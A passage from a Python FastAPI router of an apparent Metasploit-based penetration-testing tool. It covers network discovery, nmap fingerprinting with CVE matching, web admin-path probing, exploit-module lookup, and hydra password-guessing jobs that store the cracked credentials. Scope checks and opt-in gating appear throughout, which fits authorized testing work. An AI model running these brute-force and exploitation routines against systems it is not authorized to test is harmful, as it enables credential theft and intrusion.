    total = len(jobs)
    pages = max(1, (total + per_page - 1) // per_page)
    page = max(1, min(page, pages))
    start = (page - 1) * per_page
    end = start + per_page

    return PaginatedJobs(
        jobs=[Job(**j) for j in jobs[start:end]],
        total=total,
        active=sum(1 for j in everything if j["status"] in ACTIVE_STATUSES),
        page=page,
        per_page=per_page,
        pages=pages,
    )


@router.get("/jobs/{job_id}", response_model=Job)
def get_job(job_id: str) -> Job:
    job = JOBS.get(job_id)
    if job is None:
        for store in (_neighbor_jobs, _fingerprint_jobs, _passattack_jobs):
            if job_id in store:
                job = store[job_id]
                break
    if not job:
        raise HTTPException(status_code=404, detail="job not found")
    return Job(**job)


@router.get("/jobs/{job_id}/stream")
async def stream_job_events(job_id: str) -> StreamingResponse:
    """Server-Sent Events (SSE) stream of job log entries.

    Emits events as the job runs:
    - `event: log   data: {"line": "..."}`
    - `event: progress data: {"pct": 45}`
    - `event: status data: {"status": "running", "stage": "scan"}
    - `event: complete data: {"status": "completed"}`
    - `event: error data: {"error": "..."}

    Clients connect and receive pushed updates instead of polling `/jobs/{id}`.
    """

    async def event_stream() -> AsyncIterator[str]:
        last_log_len = 0
        job = JOBS.get(job_id)
        if not job:
            yield f"event: error\ndata: {json.dumps({'error': 'job not found'})}\n\n"
            return

        # Send initial state
        yield f"event: status\ndata: {json.dumps({'status': job.get('status', 'queued'), 'progress': job.get('progress', 0)})}\n\n"

        while True:
            await asyncio.sleep(1.5)
            job = JOBS.get(job_id)
            if not job:
                yield f"event: error\ndata: {json.dumps({'error': 'job not found'})}\n\n"
                break

            status = job.get("status", "running")
            progress = job.get("progress", 0)

            # Stream new log lines
            log = job.get("log", [])
            if len(log) > last_log_len:
                for line in log[last_log_len:]:
                    yield f"event: log\ndata: {json.dumps({'line': line})}\n\n"
                last_log_len = len(log)

            yield f"event: progress\ndata: {json.dumps({'pct': progress})}\n\n"

            # "done" is the terminal status the scan router writes; the other
            # names are defensive for the historical spellings
            if status in ("done", "completed", "failed", "aborted", "error"):
                yield f"event: complete\ndata: {json.dumps({'status': status})}\n\n"
                break

    return StreamingResponse(
        event_stream(),
        media_type="text/event-stream",
        headers={
            "Cache-Control": "no-cache",
            "Connection": "keep-alive",
            "X-Accel-Buffering": "no",
        },
    )


@router.get("/report/{job_id}", response_model=Report)
def get_report(job_id: str) -> Report:
    job = JOBS.get(job_id)
    if not job:
        raise HTTPException(status_code=404, detail="job not found")
    report = job.get("report")
    if report is None:
        raise HTTPException(status_code=404, detail="report not ready")
    return report


@router.get("/export/{job_id}")
def export_report(job_id: str, fmt: str = "json") -> dict[str, Any]:
    job = JOBS.get(job_id)
    if not job:
        raise HTTPException(status_code=404, detail="job not found")
    report = job.get("report")
    if report is None:
        raise HTTPException(status_code=404, detail="report not ready")
    report = Report(**report) if not isinstance(report, Report) else report

    fmt = fmt.lower()
    if fmt == "json":
        content = json.dumps(report.model_dump(), indent=2)
        name = f"h4k-{job_id}.json"
    elif fmt in ("md", "markdown", "txt"):
        content = _report_markdown(report)
        name = f"h4k-{job_id}.md"
    else:
        raise HTTPException(status_code=400, detail="format must be json or md")
    return {
        "job_id": job_id,
        "format": fmt,
        "filename": name,
        "content": content,
    }


@router.get("/neighbors")
def neighbors(cidr: str | None = None) -> dict[str, Any]:
    """Discover hosts on the local network via ARP (arp-scan / arp cache / msf)."""
    msf = _get_msf()
    if msf is None:
        raise HTTPException(status_code=503, detail="msf unavailable")
    if not cidr:
        cidr = "192.168.1.0/24"
    key = cidr
    cache_hit = key in _neighbors_cache
    if not cache_hit:
        finder = NeighborFinder(msf)
        found = finder.discover(cidr)
        _neighbors_cache[key] = NeighborFinder.neighbors_to_dicts(found)
    # Fingerprinted services live in neighbors.db, not in the ARP sweep:
    # merge them onto every response so the Recon table reflects the last
    # fingerprint. The discovery cache stays services-free on purpose.
    try:
        saved_services = _load_neighbor_services()
    except Exception:
        saved_services = {}
    neighbors = []
    for h in _neighbors_cache[key]:
        host = dict(h)
        host["services"] = saved_services.get(host.get("ip", ""), [])
        neighbors.append(host)
    return {"neighbors": neighbors, "cache": cache_hit}


@router.post("/neighbors/scan")
def neighbors_scan(background: BackgroundTasks) -> dict[str, Any]:
    """Start a local-network neighbor discovery job in the background.

    Returns a job_id that can be polled at GET /neighbors/status/{job_id}.
    Discovered hosts are immediately added to the MSF workspace so they
    appear in the network graph without requiring a full port scan.
    """
    msf = _get_msf()
    if msf is None:
        raise HTTPException(status_code=503, detail="msf unavailable")

    job_id = uuid.uuid4().hex[:12]
    job: dict[str, Any] = {
        "id": job_id,
        "status": "running",
        "progress": 0.0,
        "message": "discovering neighbors...",
        "hosts": [],
        "error": None,
        "created": datetime.now(UTC).isoformat(),
    }
    _neighbor_jobs[job_id] = job
    logger.info("[neighbors %s] discovery started", job_id)
    background.add_task(_run_neighbor_discovery, job, msf)
    return {"job_id": job_id, "status": "running"}


def _run_neighbor_discovery(job: dict[str, Any], msf: MsfClient) -> None:
    if job.get("status") == "queued":
        _update(job, status="running", message="discovering neighbors")
    try:
        from services.discovery import NeighborFinder

        finder = NeighborFinder(msf)
        default_cidr = "192.168.1.0/24"

        def _progress(msg: str, pct: float) -> None:
            _update(job, message=msg, progress=pct)

        _progress("arp scanning...", 10)
        found = finder.discover(default_cidr)
        _progress("processing results...", 80)

        data = NeighborFinder.neighbors_to_dicts(found)
        job["hosts"] = data

        skipped_out_of_scope = 0
        for h in found:
            ip = h.ip
            if not ip or ":" in ip or len(ip.split(".")) != 4:
                continue
            ok, _reason = _host_in_scope(ip)
            if not ok:
                skipped_out_of_scope += 1
                continue
            _save_neighbor_host(ip, h.mac, h.vendor, h.hostname)

        msg = f"found {len(data)} host(s)"
        if skipped_out_of_scope:
            msg += f" ({skipped_out_of_scope} skipped: outside engagement scope)"
        logger.info("[neighbors %s] %s", job["id"], msg)
        _update(job, status="done", progress=100.0, message=msg)
        _neighbors_cache[default_cidr] = data
    except Exception as exc:
        logger.exception("neighbor discovery failed")
        _update(job, status="error", error=str(exc), message="discovery failed")


def _vendor_to_os(vendor: str | None) -> str | None:
    if not vendor:
        return None
    vendor_lower = vendor.lower()
    if any(x in vendor_lower for x in ("raspberry", "pi")):
        return "Linux"
    if any(x in vendor_lower for x in ("vmware", "virtualbox", "qemu", "xen")):
        return "Linux"
    if any(
        x in vendor_lower
        for x in (
            "cisco",
            "mikrotik",
            "ubiquiti",
            "netgear",
            "tp-link",
            "dlink",
            "asus",
        )
    ):
        return "Linux"
    if any(x in vendor_lower for x in ("microsoft", "windows")):
        return "Windows"
    if any(x in vendor_lower for x in ("apple", "mac")):
        return "macOS"
    return None


@router.get("/neighbors/status/{job_id}")
def neighbors_status(job_id: str) -> dict[str, Any]:
    job = _neighbor_jobs.get(job_id)
    if not job:
        raise HTTPException(status_code=404, detail="neighbor scan job not found")
    return job


@router.get("/neighbors/jobs")
def neighbors_jobs() -> dict[str, Any]:
    """Return all neighbor discovery jobs, newest first."""
    jobs = sorted(
        _neighbor_jobs.values(), key=lambda j: j.get("created") or "", reverse=True
    )
    return {
        "jobs": [
            {
                "id": j["id"],
                "status": j["status"],
                "progress": j.get("progress"),
                "message": j.get("message"),
                "hosts": j.get("hosts", []),
                "created": j.get("created"),
            }
            for j in jobs
        ]
    }


@router.post("/neighbors/fingerprint")
def neighbors_fingerprint(
    req: dict[str, Any] | None = None, background: BackgroundTasks = None  # type: ignore[assignment]
) -> dict[str, Any]:
    """Run an nmap service/version/OS fingerprint scan across all discovered
    neighbor hosts.

    Runs: nmap -sS -sV -O -T4 -Pn -p <common ports> --max-retries 1
    --host-timeout 30s -oX - (service + OS detection).
    Results are stored in the neighbors.db and merged into the graph endpoint.
    Accepts {"ip": "x.x.x.x"} to fingerprint a single host.
    """
    body = req or {}
    ip_filter = (body.get("ip") or "").strip() or None
    if ip_filter:
        stored = _load_neighbor_hosts().get(ip_filter, {})
        neighbor_hosts = {ip_filter: {**stored, "ip": ip_filter}}
    else:
        neighbor_hosts = _load_neighbor_hosts()
    if not neighbor_hosts:
        raise HTTPException(
            status_code=400,
            detail="no neighbor hosts found — run discovery first"
            + (f" (no record for {ip_filter})" if ip_filter else ""),
        )

    job_id = uuid.uuid4().hex[:12]
    job: dict[str, Any] = {
        "id": job_id,
        "status": "running",
        "progress": 0.0,
        "message": "preparing fingerprint scan...",
        "results": [],
        "error": None,
        "created": datetime.now(UTC).isoformat(),
    }
    _fingerprint_jobs[job_id] = job
    logger.info("[fingerprint %s] starting: %d host(s)", job_id, len(neighbor_hosts))
    background.add_task(_run_fingerprint, job, list(neighbor_hosts.values()))
    return {"job_id": job_id, "status": "running"}


def _run_fingerprint(job: dict[str, Any], neighbors: list[dict[str, Any]]) -> None:
    if job.get("status") == "queued":
        _update(job, status="running", message="fingerprint starting")
    logger.info("_run_fingerprint starting with %d neighbors", len(neighbors))
    try:
        from services.toolkit import ToolkitRunner

        runner = ToolkitRunner(
            progress=lambda msg, pct: _update(job, message=msg, progress=pct)
        )
        ips = [n["ip"] for n in neighbors if n.get("ip")]
        ips = [ip for ip in ips if _host_in_scope(ip)[0]]
        total = len(ips)

        def _tick(msg: str, pct: float) -> None:
            _update(job, message=msg, progress=pct)

        _tick(f"scanning {total} host(s) one by one...", 5)

        all_results: list[dict[str, Any]] = []
        for i, ip in enumerate(ips):
            if job.get("status") == "abort_requested":
                break
            argv = [
                "nmap",
                "-sS",
                "-sV",
                "-O",
                "-T4",
                "-Pn",
                "-p",
                "22,80,443,445,3389,8080,8443,21,23,25,53,110,143,3306,5432,5900,6379,9200",
                "--max-retries",
                "1",
                "--host-timeout",
                "30s",
                "-oX",
                "-",
                ip,
            ]
            result = runner.run_tool("nmap", argv, timeout=150)
            parsed = (
                _parse_nmap_xml(result["stdout"]) if result["status"] == "ok" else []
            )
            for entry in parsed:
                entry["neighbor_info"] = next(
                    (n for n in neighbors if n.get("ip") == entry["ip"]), {}
                )
            # correlate known vulns per open service while we are here
            for entry in parsed:
                for svc in entry.get("services", []):
                    if svc.get("state") != "open":
                        continue
                    hits = _match_service_vulns(entry["ip"], svc)
                    svc["vulns"] = [
                        {
                            k: v
                            for k, v in h.items()
                            if k in ("kind", "vid", "severity", "detail")
                        }
                        for h in hits
                    ]
                    if hits:
                        _save_service_vulns(
                            entry["ip"], svc["port"], svc.get("proto", "tcp"), hits
                        )
            all_results.extend(parsed)
            job["results"] = all_results
            _tick(f"scanned {i + 1}/{total}: {ip}", 5 + int((i / total) * 85))

        _tick("saving results...", 92)

        for entry in all_results:
            ip = entry.get("ip")
            if not ip:
                continue
            n_info = entry.pop("neighbor_info", {}) or {}
            mac = entry.get("mac") or n_info.get("mac")
            services = entry.get("services", [])
            _save_neighbor_host(
                ip,
                mac,
                entry.get("vendor") or n_info.get("vendor"),
                entry.get("hostname") or n_info.get("hostname"),
                os_guess=entry.get("os"),
            )
            if services:
                _save_neighbor_services(ip, services)

        _tick(f"fingerprint complete — {len(all_results)} host(s) with open ports", 100)
        logger.info(
            "[fingerprint %s] complete: %d host(s) open, %d scanned",
            job["id"],
            sum(
                1
                for r in all_results
                if any(s.get("state") == "open" for s in r.get("services", []))
            ),
            len(all_results),
        )
        _update(job, status="done", progress=100.0)
    except Exception as exc:
        logger.exception("fingerprint failed: %s", exc)
        _update(job, status="error", error=str(exc), message="fingerprint failed")


def _parse_nmap_xml(xml_output: str) -> list[dict[str, Any]]:
    import re

    results: list[dict[str, Any]] = []
    host_blocks = re.split(r"<host ", xml_output)
    for block in host_blocks[1:]:
        ip_match = re.search(r'<address addr="([0-9.]+)" addrtype="ipv4"', block)
        mac_match = re.search(r'<address addr="([0-9a-f:]+)" addrtype="mac"', block)
        vendor_match = re.search(r'<vendor name="([^"]+)"', block)
        hostname_match = re.search(r'<hostname name="([^"]+)"', block)
        os_match = re.search(r'<osclass[^>]*osfamily="([^"]+)"', block)

        if not ip_match:
            continue
        ip = ip_match.group(1)
        services: list[dict[str, Any]] = []
        for proto, port, port_block in re.findall(
            r'<port protocol="([^"]+)" portid="([^"]+)">(.*?)</port>', block, re.DOTALL
        ):
            state_match = re.search(r'state state="([^"]+)"', port_block)
            svc_match = re.search(r'service name="([^"]+)"', port_block)
            version_match = re.search(r'version="([^"]+)"', port_block)
            product_match = re.search(r'product="([^"]+)"', port_block)
            services.append(
                {
                    "port": int(port),
                    "proto": proto,
                    "state": state_match.group(1) if state_match else "unknown",
                    "service": svc_match.group(1) if svc_match else None,
                    "version": version_match.group(1) if version_match else None,
                    "product": product_match.group(1) if product_match else None,
                }
            )

        results.append(
            {
                "ip": ip,
                "mac": mac_match.group(1) if mac_match else None,
                "vendor": vendor_match.group(1) if vendor_match else None,
                "hostname": hostname_match.group(1) if hostname_match else None,
                "os": (os_match.group(1) or "").strip() if os_match else None,
                "services": services,
            }
        )
    return results


def _match_service_vulns(ip: str, svc: dict[str, Any]) -> list[dict[str, Any]]:
    """Match a fingerprinted service against the offline CVE db + version leads.

    Returns [{kind, vid, severity, detail}] — `kind` is 'cve' for CVE db hits
    (severity = CVSS) or 'lead' for heuristic outdated/beta-version flags.
    """
    out: list[dict[str, Any]] = []
    banner = " ".join(
        filter(None, (svc.get("service"), svc.get("product"), svc.get("version")))
    )
    if not banner:
        return out

    cve_db = _get_cve_db()
    if cve_db is not None:
        from schemas import Service as SvcSchema

        pseudo = SvcSchema(
            port=svc.get("port") or 0,
            proto=svc.get("proto", "tcp"),
            service=svc.get("service"),
            state=svc.get("state"),
            info=banner,
        )
        version = svc.get("version")
        product = svc.get("product")
        seen: set[str] = set()
        for cve in cve_db.match_service(pseudo, version=version, product=product):
            vid = cve.get("id", "")
            if vid in seen:
                continue
            msf_module = cve.get("msf_module") or ""
            # auxiliary scanner matches (ssh_enumusers etc.) are recon leads,
            # not exploitable findings — leave them out of Likely Vulnerable
            if msf_module.startswith(("auxiliary/", "post/")):
                continue
            seen.add(vid)
            detail = cve.get("title") or cve.get("description") or ""
            if cve.get("msf_module"):
                detail = f"{detail} | msf: {cve['msf_module']}"
            severity = cve.get("severity")
            if not severity:
                cvss = float(cve.get("cvss") or 0.0)
                severity = (
                    "CRITICAL"
                    if cvss >= 9
                    else "HIGH" if cvss >= 7 else "MEDIUM" if cvss >= 4 else "LOW"
                )
            out.append(
                {
                    "kind": "cve",
                    "vid": vid,
                    "severity": float(cve.get("cvss") or 0.0) or None,
                    "detail": f"{severity}: {detail}" if detail else severity,
                }
            )

    from services.vulnleads import analyze_service

    for lead in analyze_service(ip, svc.get("service") or "", banner):
        out.append(
            {
                "kind": "lead",
                "vid": f"{lead.get('product')}@{lead.get('version')}",
                "severity": None,
                "detail": f"{lead.get('level')}: {lead.get('reason')}"
                + (f" (see {lead['cve_link']})" if lead.get("cve_link") else ""),
            }
        )
    return out


@router.get("/neighbors/vulns")
def neighbors_vulns() -> dict[str, Any]:
    """Known vulnerabilities correlated against fingerprinted neighbor services."""
    vulns = _load_neighbor_vulns()
    return {"vulns": vulns, "count": len(vulns)}


# ---- common password attack (opt-in, card-driven) --------------------------
# Bundled wordlists; hydra covers the classic CTF services. This is a credential
# GUESSING attack: it only runs when the operator asks for it, against hosts in
# the current session.

PASSATTACK_SERVICES: dict[str, dict[str, Any]] = {
    "ssh": {"hydra": "ssh", "default_port": 22},
    "ftp": {"hydra": "ftp", "default_port": 21},
    "telnet": {"hydra": "telnet", "default_port": 23},
    "mysql": {"hydra": "mysql", "default_port": 3306},
    "http-basic": {"hydra": "http-get", "default_port": 80, "path": "/"},
    # HTML form login (hydra http-post-form). Needs an explicit form spec:
    # {path, user_field, pass_field, fail} where `fail` is a response marker
    # that is present ONLY on a failed login (e.g. 'name="username"').
    # The operator must supply it — guessing it would fabricate results.
    "http-form": {"hydra": "http-post-form", "default_port": 80},
}


@router.post("/passattack")
def pass_attack(req: dict[str, Any], background: BackgroundTasks) -> dict[str, Any]:
    """OPT-IN: common-password attack (hydra) against one service on one host."""
    host = (req.get("host") or "").strip()
    service = (req.get("service") or "").strip()
    if not host or service not in PASSATTACK_SERVICES:
        raise HTTPException(
            status_code=422,
            detail="host + service required (ssh/ftp/telnet/mysql/http-basic/http-form)",
        )
    form = req.get("form") or {}
    if service == "http-form" and not str(form.get("fail") or ""):
        raise HTTPException(
            status_code=422,
            detail="http-form needs form:{path?, user_field?, pass_field?, fail} — "
            "fail is a response marker present ONLY on a failed login",
        )
    _demand_scope(host)
    msf = _get_msf()
    if msf is None:
        raise HTTPException(status_code=503, detail="msf unavailable")

    job_id = uuid.uuid4().hex[:12]
    job: dict[str, Any] = {
        "id": job_id,
        "host": host,
        "service": service,
        "port": int(req.get("port") or PASSATTACK_SERVICES[service]["default_port"]),
        "status": "running",
        "progress": 0.0,
        "message": f"starting {service} password attack on {host}...",
        "found": [],
        "attempts": 0,
        "log": [],
        "error": None,
        "created": datetime.now(UTC).isoformat(),
    }
    _passattack_jobs[job_id] = job
    background.add_task(
        _run_pass_attack,
        job,
        host,
        service,
        job["port"],
        req.get("users"),
        req.get("passwords"),
        req.get("form") if service == "http-form" else None,
    )
    return {"job_id": job_id, "status": "running"}


def _run_pass_attack(
    job: dict[str, Any],
    host: str,
    service: str,
    port: int,
    users: list[str] | None = None,
    passwords: list[str] | None = None,
    form: dict[str, Any] | None = None,
) -> None:
    if job.get("status") == "queued":
        _update(job, status="running", message="password attack starting")
    logger.info("[passattack %s] %s:%s/%s launched", job["id"], host, port, service)
    import re as _re
    import time as _time

    from services.toolkit import ToolkitRunner

    runner = ToolkitRunner(
        progress=lambda msg, pct: _update(job, message=msg, progress=pct)
    )
    cfg = PASSATTACK_SERVICES[service]

    userlist = str(_RUNTIME_DATA / "users.txt")
    passlist = str(_RUNTIME_DATA / "passwords.txt")
    if users:
        with open(userlist + ".run", "w", encoding="utf-8") as fh:
            fh.write("\n".join(users))
        userlist += ".run"
    if passwords:
        with open(passlist + ".run", "w", encoding="utf-8") as fh:
            fh.write("\n".join(passwords))
        passlist += ".run"

    def _count(path: str) -> int:
        try:
            return sum(1 for line in open(path, encoding="utf-8") if line.strip())
        except OSError:
            return 0

    n_users, n_pass = _count(userlist), _count(passlist)
    job["attempts"] = n_users * n_pass

    # no "-o -": hydra treats that as a *file* named "-" and litters the
    # working directory. Without it, hydra prints the hits to stdout, which is
    # what we parse below.
    argv = [
        "hydra",
        "-L",
        userlist,
        "-P",
        passlist,
        "-t",
        "6",
        "-f",
    ]
    if service == "http-form":
        form = form or {}
        path = str(form.get("path", "/index.php"))
        user_field = str(form.get("user_field", "username"))
        pass_field = str(form.get("pass_field", "password"))
        fail = str(form.get("fail", ""))
        if not fail:  # endpoint validates first; this is the backstop
            job["error"] = "http-form needs form.fail"
            _update(job, status="error", progress=100.0, message="no fail marker")
            return
        spec = f"{path}:{user_field}=^USER^&{pass_field}=^PASS^:{fail}"
        argv += ["-s", str(port), host, "http-post-form", spec]
    elif service == "http-basic":
        argv += [f"http-get://{host}:{port}{cfg.get('path', '/')}"]
    else:
        argv += [host, cfg["hydra"]]

    def _logline(msg: str) -> None:
        job["log"].append(msg)

    _logline(
        f"$ hydra {' '.join(argv[6:])} ({n_users} users x {n_pass} passwords = {n_users * n_pass} attempts)"
    )
    start = _time.time()
    result = runner.run_tool("hydra", argv, timeout=900)
    _logline(
        f"hydra rc={result['rc']} elapsed={result['elapsed']}s"
        + (" (timed out)" if result["timed_out"] else "")
    )
    out = result["stdout"] + "\n" + result["stderr"]

    # hydra success line: [22][ssh] host: 192.168.1.11   login: root   password: secret
    creds: list[dict[str, Any]] = []
    for match_ in _re.findall(
        r"\[\d+\]\[[^\]]+\]\s*host:\s*([\d.]+)\s+login:\s*([^\s]+)\s+password:\s*([^\s]+)",
        out,
    ):
        creds.append(
            {
                "host": match_[0],
                "port": port,
                "service": service,
                "user": match_[1],
                "password": match_[2],
            }
        )

    # dedupe
    creds = [dict(t) for t in {tuple(sorted(d.items())) for d in creds}]

    if creds:
        conn = _neighbor_db()
        from datetime import UTC as _UTC

        now = datetime.now(_UTC).isoformat()
        for c in creds:
            conn.execute(
                "INSERT OR REPLACE INTO found_creds (host, port, service, user, password, found_at) "
                "VALUES (?, ?, ?, ?, ?, ?)",
                (c["host"], c["port"], c["service"], c["user"], c["password"], now),
            )
        conn.commit()
        conn.close()

    job["found"] = creds
    _update(
        job,
        status="done",
        progress=100.0,
        message=(
            f"found {len(creds)} credential(s)"
            if creds
            else f"no match ({n_users * n_pass} attempts, {round(_time.time() - start)}s)"
        ),
    )


@router.get("/passattack/targets")
def pass_attack_targets() -> dict[str, Any]:
    """Fingerprinted hosts running a service a common-password attack applies to.

    Only open services whose name matches a hydra-supported service family
    (ssh/ftp/telnet/mysql/http) are listed — the Default-Cred Targets card.
    """
    eligible = {"ssh", "ftp", "telnet", "mysql", "http", "https", "http-alt"}
    conn = _neighbor_db()
    rows = conn.execute(
        "SELECT ip, port, service, version, product FROM discovered_services "
        "WHERE state = 'open' ORDER BY ip, port"
    ).fetchall()
    conn.close()
    cred_host_ports: set[tuple[str, int]] = set()
    with suppress(Exception):
        for c in pass_attack_creds().get("creds", []):
            cred_host_ports.add((c["host"], c["port"]))
    targets: list[dict[str, Any]] = []
    for r in rows:
        service = (r[2] or "").lower()
        # map nmap service names to attackable families
        family = next((f for f in eligible if f in service), None)
        if not family:
            continue
        attack_svc = {
            "ssh": "ssh",
            "ftp": "ftp",
            "telnet": "telnet",
            "mysql": "mysql",
            "http": "http-basic",
            "https": "http-basic",
            "http-alt": "http-basic",
        }.get(family, "http-basic")
        targets.append(
            {
                "ip": r[0],
                "port": r[1],
                "service": service,
                "version": r[3],
                "product": r[4],
                "attack_service": attack_svc,
                "creds_found": (r[0], r[1]) in cred_host_ports,
            }
        )
    return {"targets": targets, "count": len(targets)}


@router.get("/passattack/creds/all")
def pass_attack_creds() -> dict[str, Any]:
    """All credentials found by password attacks in this session."""
    conn = _neighbor_db()
    rows = conn.execute(
        "SELECT host, port, service, user, password, found_at FROM found_creds ORDER BY found_at DESC"
    ).fetchall()
    conn.close()
    return {
        "creds": [
            {
                "host": r[0],
                "port": r[1],
                "service": r[2],
                "user": r[3],
                "password": r[4],
                "found_at": r[5],
            }
            for r in rows
        ],
        "count": len(rows),
    }


def _do_web_probe(host: str, port: int) -> dict[str, Any]:
    """GET-level probe of an HTTP(S) surface: server header, title, admin paths."""
    import urllib.error
    import urllib.request

    scheme = "https" if port in (443, 8443) else "http"
    base = f"{scheme}://{host}:{port}"

    headers = {"User-Agent": "h4k-webprobe/1.0"}
    result: dict[str, Any] = {
        "host": host,
        "port": port,
        "base": base,
        "title": None,
        "server": None,
        "paths": [],
    }

    def _get(url: str) -> tuple[int, str, dict[str, str]]:
        try:
            with urllib.request.urlopen(  # nosec B310 - fixed scheme, lab targets
                urllib.request.Request(url, headers=headers), timeout=4
            ) as resp:
                return (
                    resp.status,
                    resp.read(2048).decode("utf-8", errors="replace"),
                    dict(resp.headers),
                )
        except urllib.error.HTTPError as exc:
            return exc.code, "", dict(exc.headers or {})
        except Exception:
            return 0, "", {}

    status, body, hdrs = _get(f"{base}/")
    if not status:
        raise HTTPException(status_code=502, detail=f"no HTTP response from {base}")
    result["server"] = hdrs.get("Server") or hdrs.get("server")
    import re as _re

    m = _re.search(r"<title[^>]*>(.*?)</title>", body, _re.IGNORECASE | _re.DOTALL)
    if m:
        result["title"] = m.group(1).strip()[:120]

    admin_paths = [
        "/admin",
        "/admin/",
        "/login",
        "/login/",
        "/api",
        "/config",
        "/setup",
        "/index.php",
        "/management",
    ]
    for p in admin_paths:
        pstatus, _, _ = _get(f"{base}{p}")
        if pstatus in (200, 301, 302, 401, 403):
            result["paths"].append({"path": p, "status": pstatus})

    return result


@router.post("/webprobe")
def web_probe(req: dict[str, Any]) -> dict[str, Any]:
    """Probe an HTTP(S) service: server header, page title, common admin paths.

    Read-only recon enrichment for the Default-Cred Targets card — no exploit,
    no brute force, just GETs. Scope-enforced.
    """
    host = (req.get("host") or "").strip()
    port = int(req.get("port") or 80)
    if not host:
        raise HTTPException(status_code=422, detail="host required")
    _demand_scope(host)
    return _do_web_probe(host, port)


@router.get("/passattack/{job_id}")
def pass_attack_status(job_id: str) -> dict[str, Any]:
    job = _passattack_jobs.get(job_id)
    if not job:
        raise HTTPException(status_code=404, detail="password attack job not found")
    return job


@router.get("/exploit-candidates")
def exploit_candidates(service: str, port: int | None = None) -> dict[str, Any]:
    """Alternative MSF exploit modules for a failed-finding escalation ladder.

    Offline-first: modules attached to CVEs that mention this service, plus the
    static service->module map. (Iterating every MSF module over RPC is slow
    and unreliable — the curated path is faster and more relevant.)
    """
    blob = f"{service} {port or ''}".lower()
    mods: list[str] = []
    cve_db = _get_cve_db()
    if cve_db is not None:
        for cve in cve_db.cves:
            mod = cve.get("msf_module") or ""
            if not mod.startswith("exploit/"):
                continue
            svc_list = [s.lower() for s in cve.get("service", [])]
            prod = str(cve.get("product", "")).lower()
            if service.lower() in svc_list or prod in blob or prod == service.lower():
                mods.append(mod)
    try:
        from services.attack import STATIC_SERVICE_MODULES

        s = service.lower()
        mapped = STATIC_SERVICE_MODULES.get(s)
        if not mapped:
            for key, module in STATIC_SERVICE_MODULES.items():
                if key in s:
                    mapped = module
                    break
        if mapped:
            mods.append(mapped)
    except Exception:  # pragma: no cover - defensive
        pass
    mods = list(dict.fromkeys(mods))[:12]
    return {"service": service, "candidates": mods, "count": len(mods)}


@router.get("/neighbors/fingerprint/status/{job_id}")
def fingerprint_status(job_id: str) -> dict[str, Any]:
    job = _fingerprint_jobs.get(job_id)
    if not job:
        raise HTTPException(status_code=404, detail="fingerprint job not found")
    return job


@router.get("/neighbors/fingerprint/results/{job_id}")
def fingerprint_results(job_id: str) -> dict[str, Any]:
    job = _fingerprint_jobs.get(job_id)
    if not job:
        raise HTTPException(status_code=404, detail="fingerprint job not found")
    if job["status"] != "done":
        raise HTTPException(status_code=202, detail="scan not yet complete")
    return {"results": job.get("results", []), "count": len(job.get("results", []))}


@router.get("/graph")
def get_graph() -> dict[str, Any]:
    """Return the current MSF workspace as a host->port->service graph,
    merged with any neighbor hosts discovered via /api/neighbors/scan that
    have not yet been port-scanned.

    Graph shape:
      nodes:  [{id, label, type, os, vendor, service_count}]
      edges:  [{source, target, type, port, service, state}]
    """
    msf = _get_msf()
    if msf is None:
        raise HTTPException(status_code=503, detail="msf unavailable")

    workspace = msf.current_workspace()
    hosts = msf.hosts(workspace)
    services = msf.services(workspace)

    eng_id, eng_store = _active_scope()
    # `in_scope` takes (engagement_id, host) -- bind the engagement here so the
    # probe below can be called with just a host.
    out_of_scope_probe = (
        (lambda host: eng_store.in_scope(eng_id, host))
        if (eng_id and eng_store)
        else None
    )

    vuln_count_by_host: dict[str, int] = {}
    for v in _load_neighbor_vulns():
        vuln_count_by_host[v["ip"]] = vuln_count_by_host.get(v["ip"], 0) + 1

    session_hosts: set[str] = set()
    with suppress(Exception):
        for sess in (msf.sessions() or {}).values():
            host = sess.get("target_host") or sess.get("host") or ""
            if host:
                session_hosts.add(str(host))
    with suppress(Exception):
        conn = _neighbor_db()
        for row in conn.execute("SELECT host FROM exploit_sessions"):
            if row[0]:
                session_hosts.add(str(row[0]))
        conn.close()

    msf_node_ids: set[str] = set()
    nodes = []
    for h in hosts:
        addr = h.get("host") or h.get("address")
        if not addr:
            continue
        msf_node_ids.add(addr)
        nodes.append(
            {
                "id": addr,
                "label": addr,
                "type": "host",
                "os": h.get("os"),
                "vendor": h.get("name"),
                "service_count": 0,
                "vuln_count": vuln_count_by_host.get(addr, 0),
                "has_session": addr in session_hosts,
                "out_of_scope": bool(
                    addr and out_of_scope_probe and not out_of_scope_probe(addr)
                ),
            }
        )

    edges = []
    svc_count_by_host: dict[str, int] = {}
    for s in services:
        host = s.get("host") or s.get("address")
        port = s.get("port")
        if not host or port is None:
            continue
        svc_count_by_host[host] = svc_count_by_host.get(host, 0) + 1
        edges.append(
            {
                "source": host,
                "target": f"{host}:{port}",
                "type": "service",
                "port": port,
                "proto": s.get("proto", "tcp"),
                "service": s.get("name"),
                "state": s.get("state"),
                "info": s.get("info"),
            }
        )

    neighbor_svcs = _load_neighbor_services()
    for ip, info in _load_neighbor_hosts().items():
        if ip in msf_node_ids:
            continue
        vendor = info.get("vendor")
        hostname = info.get("hostname")
        os_val = info.get("os") or (_vendor_to_os(vendor) if vendor else None)
        nodes.append(
            {
                "id": ip,
                "label": ip,
                "type": "host",
                "os": os_val,
                "vendor": vendor or hostname or None,
                "service_count": len(neighbor_svcs.get(ip, [])),
                "vuln_count": vuln_count_by_host.get(ip, 0),
                "has_session": ip in session_hosts,
                "out_of_scope": bool(out_of_scope_probe and not out_of_scope_probe(ip)),
            }
        )
        msf_node_ids.add(ip)

    for ip, svcs in neighbor_svcs.items():
        for svc in svcs:
            edges.append(
                {
                    "source": ip,
                    "target": f"{ip}:{svc['port']}",
                    "type": "service",
                    "port": svc["port"],
                    "proto": svc.get("proto", "tcp"),
                    "service": svc.get("service"),
                    "state": svc.get("state", "unknown"),
                    "info": (svc.get("product") or "")
                    + (" " + svc["version"] if svc.get("version") else ""),
                }
            )
            svc_count_by_host[ip] = svc_count_by_host.get(ip, 0) + 1

    for node in nodes:
        node["service_count"] = svc_count_by_host.get(node["id"], 0)

    return {"nodes": nodes, "edges": edges}


@router.post("/attack")
def attack_target(req: AttackRequest, background: BackgroundTasks) -> dict[str, Any]:
    """OPT-IN only: launch active attacks against an authorized target."""
    msf = _get_msf()
    if msf is None:
        raise HTTPException(status_code=503, detail="msf unavailable")
    _demand_scope(req.host or req.target)
    job_id = uuid.uuid4().hex[:12]
    job = {
        "id": job_id,
        "target": req.target,
        "status": "queued",
        "attacks": [],
        "created": datetime.now(UTC).isoformat(),
    }
    _attack_jobs[job_id] = job
